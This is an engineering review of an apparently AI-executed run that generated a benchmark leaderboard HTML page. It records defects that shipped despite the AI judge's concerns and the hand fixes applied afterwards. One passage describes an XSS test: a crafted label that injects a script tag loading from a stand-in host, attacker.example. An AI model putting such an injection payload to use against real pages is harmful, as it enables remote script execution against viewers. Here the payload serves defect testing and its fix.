# dogfood-139 — the benchmark result is now a page a skeptic can open (WP-303)

**WP:** WP-303 (leaderboard site + methodology) · **Date:** 2026-08-14 ·
**Spec:** `examples/dogfood/dogfood-139-wp303-leaderboard-site.yaml` ·
**Run:** `run-ab72b901-4f3f-4b98-b6e1-ca00324ff0a6` · **Landed:** this review's commit ·
**Ladder:** rung-5 (P3 exit gate) **half** climbed — ledger `rung=4`, unchanged

## Plain lead

The head-to-head benchmark numbers were machine-readable only; now there is a real
web page that opens with no network, shows both systems as confidence *ranges*, and
says in plain words that neither one won. The page is generated from the published
data, so it cannot drift from it.

The run sealed 🟢 SUCCESS — **and it should not have.** The judge named three
concerns, two of them real defects in the delivered code, and the seal path carried
them into the record as prose instead of acting on them. Both defects are fixed in
this review, along with a third the judge missed and a hole in the gate itself.

## Trace

| field | value |
|---|---|
| terminal | 🟢 SUCCESS · 1 step · 4m 40s |
| cost | **$0.1048** of $20 budget (**0.5%**) — judge share **100.0%** |
| executor | `gemini-cli(gemini)` — **$0.0000 on 4.4k real tokens**; trace header flags `⚠ cost meter blind (unpriced tokens)` |
| judge | `openai-compat` (`gpt-5.6-sol` xhigh) · 2 passes |
| verdicts | rollbacks 0 · escalations 1 · resumes 0 |
| checkpoints | 1 · injections 0 |
| acceptance | AC-1 PASS · AC-2 PASS (re-run in the working tree (brownfield — harvested delivery)) |
| harvest | 5/5 files byte-**IDENTICAL** to the run workspace |

**Per-step:**

| # | tokens in/out | cost | wall | verdict |
|---|---|---|---|---|
| 1 | 3.2k/1.2k | $0.0000 | 2m 57s | ⚠ ESCALATE |

No empty-diff probe step — **F-11 (wasted probe step) did not recur**.

## Delivery quality (human review, post-landing)

**Landed files (5, all byte-identical to the run workspace):**

| file | what |
|---|---|
| `benchmarks/harness/src/leaderboard.ts` | `generateLeaderboardHtml` + `linkOrText`; `writeLeaderboard` now writes `index.html` |
| `benchmarks/harness/src/main.ts` | CLI prints the HTML path |
| `benchmarks/harness/src/index.ts` | barrel re-export of `generateLeaderboardHtml` |
| `benchmarks/harness/test/leaderboard.test.ts` | +1 HTML test, existing `writeLeaderboard` test extended |
| `benchmarks/publications/leaderboard/index.html` | the published page (302 lines, committed, not gitignored) |

**Scope: clean.** Exactly the surface the goal named — no new dependency, no
provider SDK, no HTML templating library, no `any`. The JSON and Markdown outputs
are untouched in shape and content.

**The goal, line by line — all six clauses met:**

- Self-contained HTML alongside JSON/Markdown, from the same bundles ✅ (all CSS
  inline, zero external `src`/`href`, no remote `@import`).
- Leads with the range ✅ — every arm renders as `[low%, high%]`; point estimates
  are a secondary column.
- Copied, never recomputed ✅ — AC-1's synthetic bundles carry an `iSrRange`
  deliberately inconsistent with their own counts, and the page prints the stored
  bounds.
- Methodology from the data ✅ — corpus size, requirement count, both adapters,
  I-SR/D-SR definitions, "95% Wilson score".
- Every local link resolves ✅ *(but only by accident — see F-338)*.
- Durable committed path ✅ — `git check-ignore` exits 1.

**Traps A–H: all eight rejected by the ACs as designed.** The page states
*"Overlap at 95% confidence; the arms are not separated"* and names no winner, on
real data where the intervals genuinely overlap.

**Independent verification of what the ACs took on trust.** The judge's first
concern was that lint, standalone typecheck and the full vitest run were asserted
*only in the executor's summary*. I ran all four commands myself:

| command | result | executor's claim |
|---|---|---|
| `pnpm --filter @chikory/benchmarks run build` | exit 0 (`tsc`) | exit 0 ✅ |
| `pnpm --filter @chikory/benchmarks run lint` | exit 0 (`eslint .`) | exit 0 ✅ |
| `pnpm --filter @chikory/benchmarks run typecheck` | exit 0 | exit 0 ✅ |
| `pnpm --filter @chikory/benchmarks run test` | **15 files / 210 tests passed** | 15 / 210 ✅ |

**Every claim was true.** Concern 1 is a false positive on substance — but a true
positive at the evidence altitude, which is the point: nothing in the run *could*
have distinguished an honest summary from an invented one.

**The second Thesis-KPI holds — F-331 is live-proven.** The spec declared
`regression_suite:`, and judge pass #2 carries
`✓ pre_existing_suite_still_green — regression suite command 'pnpm --filter @chikory/benchmarks exec vitest run' exited 0`.
Before the dogfood-138 hand-fix that pass did not happen at all. F-197 satisfied:
the run that delivers a runner fix cannot prove it, so the *next* run carried the
assertion, and it passed.

## New friction

### 🔴 F-334 — a converged-escalate seal discards a non-deterministic completion-review finding

`regressionGateBeforeSuccess` (`packages/sdk-ts/src/workflow/agent-loop.ts:397`)
ends by delegating to `sealFromRubricFails` (`:352`), which condemns **only**
`DETERMINISTIC_RUBRIC_IDS` (`packages/sdk-ts/src/judge/rubric.ts:28` — three ids:
`no_architecture_violations`, `no_secrets_introduced`,
`pre_existing_suite_still_green`) and returns `undefined` for everything else.

On the PROCEED path that `undefined` is *correct*: the caller answers it by handing
the executor a bounded design-fix brief (`buildCompletionReviewBrief`). On the
converged-escalate path there is no such caller — `undefined` means **"the caller's
SUCCESS seal stands"** (`:1328`). So a completion review answering
`design_serves_overall_goal: ✗` on a converged step sealed 🟢 SUCCESS with the
finding discarded in silence. This is the judge-detects-but-does-not-gate shape
(F-180/WP-537) surviving at the one altitude WP-537 never reached.

**HAND-FIXED.** A surviving finding now condemns — FAILED + resumable, the item
named in the reason — while the gate stays terminal-or-nothing (dogfood-121 lost a
5-node chain to a converged step re-raising the same concern forever). Proven
RED-then-GREEN: Scenario 8
(`packages/sdk-ts/test/runner/regression-suite-repair-live.test.ts:423`) failed
`expected 'SUCCESS' to be 'FAILED'` pre-fix; sdk suite **1379 → 1380** green, and
F-331 Scenarios 5/6/7 unregressed.

### 🔴 F-335 — the escalation's own out-of-rubric concerns are never adjudicated, and two real defects shipped 🟢 SUCCESS

The load-bearing finding of this review. Judge pass #1 returned ESCALATE with three
free-text concerns. Judge pass #2 — the F-331 completion review — ran a *different,
smaller* rubric (4 items vs 6) on the **byte-identical diff** (`3bb7b4d56554`,
27,395 bytes, cited by both passes), never re-tested the three concerns, and the run
sealed SUCCESS. The concerns survive only as prose inside the terminal reason.

The F-229/F-271 seal fires on `allCriteriaPass && allRubricPass`
(`agent-loop.ts:1328`), and its comment justifies that on the premise that a
converged concern is about *evidence the diff cannot carry* — "there is nothing left
for the executor to produce". **That premise did not hold here.** Two of the three
concerns named genuine, reproducible defects in the delivered code (F-336, F-337
below), which the executor could have fixed in one step. Every criterion passed only
because the ACs did not test for them.

The gap the code cannot currently see: an out-of-rubric concern about *missing
evidence* (seal — nothing to do) versus one *naming a defect in the diff* (do not
seal — plenty to do). Both are `out_of_rubric` + all-pass today.

**→ WP-619 (queued).** The escalation's concerns must be adjudicated exactly once,
against the diff, inside the completion-review pass that already happens — one
settled row, terminal-or-nothing, no loop re-entry. With F-334 fixed, a confirmed
concern then condemns automatically.

### 🟠 F-336 — the published page fabricated a corpus it never measured

`generateLeaderboardHtml` fell back to `5` tasks and `19` requirements — *today's
real corpus* — whenever `entries` was empty. Proven by driving the exported function
with `{entries: [], pairwise: []}`; it rendered:

> Evaluation conducted across **5** repository tasks comprising **19** total requirements.

A page with no data published a measurement nobody took. This is trap D (today's
result baked into the template) at the **counts** altitude; AC-1 guarded trap D only
at the **interval** altitude (`!includes("83.2")`), so it passed. The function is
exported from the barrel, so any caller can reach it.

**HAND-FIXED** — `benchmarks/harness/src/leaderboard.ts:294` now emits *"No arms
were evaluated — this leaderboard carries no measured corpus."* +1 test
(`benchmarks/harness/test/leaderboard.test.ts:246`).

### 🟠 F-337 — bundle data could rewrite the page's markup, defeating trap E

Every string the generator interpolated came from a published bundle — arm labels,
adapters, bundle paths, pairwise names, `orderedBy` — and none were escaped. Driving
the built artifact with a crafted label injected a live
`<script src="https://attacker.example/x.js">` into a page whose entire promise is
that it renders with no network. The delivery's own test asserted no-remote-assets
using benign fixtures only, so it passed.

**HAND-FIXED** — `escapeHtml` (`benchmarks/harness/src/leaderboard.ts:157`) applied
to every data-derived interpolation. +1 test
(`benchmarks/harness/test/leaderboard.test.ts:175`).

*Residual, deliberately not "fixed":* an arm whose **label** contains the word
"outperforms" still renders that word as escaped text. Escaping cannot make a data
label stop reading like a claim, and censoring published data would be worse. The
page's own claim sentences are generated from `pairwise[].separated` and remain
data-driven; that is the property that matters and it is asserted.

### 🟠 F-338 — the page's evidence links depended on which directory the CLI ran from

Found while regenerating the page during this review. `entry.bundle` is anchored to
the **repo root** (the F-267/WP-591 rule), but `linkOrText`'s existence probe
resolved it against `process.cwd()`. Generated from the repo root the links resolve
and become `<a href="../p3-rung-4">`; generated from `benchmarks/harness` — **which
is exactly what AC-2 itself does** — all four evidence links silently degraded to
bare `<span>` and the evidence vanished from the page.

Trap G ("no dead links") passes in *both* directions, because a `<span>` emits no
href to be dead. The graceful degradation the judge praised is precisely what hid
this.

**HAND-FIXED** — `repoRootFrom` (`benchmarks/harness/src/leaderboard.ts:177`)
anchors the probe on the repo root containing the output directory. Proven on the
real artifact: regenerated from `benchmarks/harness`, the page is now byte-identical
to the repo-root generation and keeps both links. +1 test
(`benchmarks/harness/test/leaderboard.test.ts:205`).

### 🟡 F-339 — the stale-spec launcher guard refused a legitimate spec, and is wrong on six more rows

The first launch attempt was refused at $0:

```
[chikory] WARNING: stale spec: target WP-303 already done (🟢) — spec is stale
[chikory] refusing to launch: the spec targets an already-done WP.
```

WP-303 was **not** done — `plan.md:331` carries it 🟡 with the residue named
verbatim (*"Still open: the static site + methodology prose"*), which is exactly
what this run built. `statusFromNotes`
(`packages/sdk-ts/src/cli/wp-status.ts:75`) reads a bare `LANDED` as a done-marker
(`:63`), so *"✅ **DATA HALF LANDED**"* reads as done, and the open-qualifier scan is
bounded to the first 300 characters (`:60`) — "Still open" sits far past it.

Measured against the real `plan.md` with the production parser, the guard is wrong
in **both** directions on 7 rows:

| WP | parser | truth |
|---|---|---|
| WP-303, WP-304 | green (done) | 🟡, residue named in the row |
| WP-254, WP-257, WP-261, WP-247 | green | 🟡/🟢-with-caveats, several say "REMAINING" |
| WP-540 | **red** (open) | ✅ actually done |

The guard is documented as fail-open (a fragile heuristic must never block a
legitimate run) — the false *positives* break that contract. Launch proceeded with
`CHIKORY_ALLOW_STALE_SPEC=1`.

**→ WP-620 (queued).** Not hand-fixed: `HALF LANDED`/`PARTIAL LANDED` appears on 6
plan rows and WP-540 is already inverted, so a blind marker tweak would flip other
rows the wrong way. Needs the oracle written against the real `plan.md`, both
directions, before touching the heuristic.

## Friction disposition

| F-n | severity | defect | disposition |
|---|---|---|---|
| F-334 | 🔴 | converged-escalate seal discards a non-deterministic completion-review finding | **HAND-FIXED THIS SITTING** — `agent-loop.ts:424`; Scenario 8 RED→GREEN, sdk 1379 → **1380** |
| F-335 | 🔴 | the escalation's own out-of-rubric concerns are never adjudicated; 2 real defects sealed 🟢 SUCCESS | **→ WP-619 (queued)** |
| F-336 | 🟠 | page fabricated "5 tasks / 19 requirements" on empty data | **HAND-FIXED THIS SITTING** — `leaderboard.ts:294`; +1 test |
| F-337 | 🟠 | unescaped bundle data could inject markup / a remote asset (trap E) | **HAND-FIXED THIS SITTING** — `leaderboard.ts:157`; +1 test |
| F-338 | 🟠 | evidence links depended on the CLI's cwd; degraded to `<span>` with trap G blind | **HAND-FIXED THIS SITTING** — `leaderboard.ts:177`; +1 test, proven on the real artifact |
| F-339 | 🟡 | stale-spec guard false-positive on WP-303 (+6 more rows wrong) | **→ WP-620 (queued)** |

Benchmark suite **210 → 213** green; sdk suite **1379 → 1380** green; lint and
typecheck clean; both ACs re-run GREEN against the fixed tree.

## Verdict on the thesis

**The published artifact is the strongest thing here.** The page leads with ranges,
refuses to name a winner where the intervals overlap, and is regenerable from the
bundle it publishes. NF-5 — *publish what was measured, not what we wish it showed*
— is now executable rather than aspirational. That is the whole of the WP-303 half
of the exit gate.

**The judging story is the caution, and it cuts both ways.** The different-family
judge found two genuine defects that four green acceptance checks and the executor's
own tests all missed — more evidence for the standing rule to *always read the
rubric block*. But finding them changed nothing: the run sealed 🟢 SUCCESS and the
defects landed. A judge whose true positives do not gate is a very expensive linter.

This is the third recurrence of that family (F-180 → WP-537 fixed it for rubric
failures; F-288 for a dropped concern), and the pattern is now unmistakable: **each
fix closes the altitude it was written for, and the next run finds the next
altitude.** F-334 closes one more (a non-deterministic finding on a converged step).
F-335 is the altitude that shipped these defects, and it is queued as the next
headline.

The horizon axis remains flat — 1 step, $0.10, no resume. The ladder did not move:
this climbs the WP-303 **half** of rung 5, and a rung is satisfied only when its
proof is whole (the dogfood-124 precedent), so the ledger stays `rung=4`.

## KPI (DOGFOODING §1.4)

| KPI | this run | trailing window |
|---|---|---|
| max horizon survived | 1 step / 4m 40s | 1 step (trailing-3) vs 4 (prior-3) — flat |
| kill → resume count | 0 | 0 over trailing-3 |
| judge true-positives pre-land | **2** (F-336, F-337 — named pre-land, shipped anyway) | 1 · 0 · 0 (136–138) |
| meta:product headline ratio | 0:1 (product) | **0/3 harness-meta** — cap not busted |
| per-step reliability (runs ≥5 steps) | n/a (<5 steps) | **94.7%** (9 rollbacks / 170 steps, 21 runs) — target 99%+ |
| ladder rung vs exit gate | rung-5 **half** (WP-303) — ledger `rung=4` | rung 0 over trailing-3; P3 exit gate = rung 5 |

## NEXT RUN

**Make a judge's out-of-rubric concern something the run must answer, so a converged
step cannot seal green while carrying a named defect in its own code.**

- **Spec:** `examples/dogfood/dogfood-140-wp619-adjudicate-escalation-concerns.yaml`
- **WP:** WP-619 (adjudicate escalation concerns before the converged seal) — new
  row, spawned by F-335 this review.
- **Why THIS and not the ladder rung:** the §0 progression gate reads ⛔ **STALLED**,
  which binds the next headline to the P3 ladder rung (WP-530). Rung 5's remaining
  half is **WP-304**, and it cannot run: it needs the OpenHands arm plus a corpus
  wide enough to separate 19 requirements — a quota-bound multi-hour suite that
  dogfood-122 proved an LLM executor must not supervise, and the operator runs those
  arms by hand. WP-303's half is closed by this run. So the rung is not runnable as
  a dogfood headline this sitting, and the next headline is the 🔴 that let this very
  run ship two defects green. **This will be re-confirmed against the gate before the
  spec is armed** (see below).
- **Designed trap:** the plausible-but-wrong delivery is a gate that condemns on the
  *presence* of any concern — which would re-seal dogfood-121's fate (a converged
  step re-raising an evidence-shaped concern forever, killing a chain whose delivery
  was already committed). The ACs must drive **both** shapes through the real seal
  path: an evidence-shaped concern ("the diff cannot show me the suite totals") must
  still seal SUCCESS, and a defect-shaped concern naming the delivered code must seal
  FAILED — with the adjudication settled in exactly **one** extra judge pass, never a
  loop re-entry.

**Gate verdicts — NOT YET RECORDED.** Phases 0–4 of this review are complete and
landed; the phase-5 gates (§1.1 failure-surface, §1.2 product-progress, §1.3
mission-critical, §1.5 friction-budget), the spec itself, and its RED/GREEN arming
have **not** been done. I stopped here rather than write a spec whose gates I had not
actually applied.

**AC arming evidence:** none yet — the spec does not exist.

To finish readying dogfood-140 (gates, spec, both-direction arming, `$0` preflight):

```sh
devbox run -- bash scripts/dogfood-open.sh   # then continue the review at phase 5
```
